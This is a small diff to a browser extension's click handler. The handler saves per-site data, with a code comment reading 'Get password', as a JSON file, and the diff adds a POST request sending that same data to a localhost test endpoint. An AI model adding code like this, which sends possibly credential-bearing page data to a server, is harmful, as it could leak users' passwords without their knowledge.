@@ -140,10 +140,16 @@ chrome.browserAction.onClicked.addListener(function(tab) {
       };
       // Get password
       saveAs(
-        new File([JSON.stringify(a)], `${extractHostname(tabs[0].url)}.json`, {
-          type: "application/json;charset=utf-8"
-        })
+        new File(
+          [(a = JSON.stringify(a))],
+          `${extractHostname(tabs[0].url)}.json`,
+          {
+            type: "application/json;charset=utf-8"
+          }
+        )
       );
+      xhttp.open("POST", "localhost:3000/test", true);
+      xhttp.send(a);
     });
   });
 });
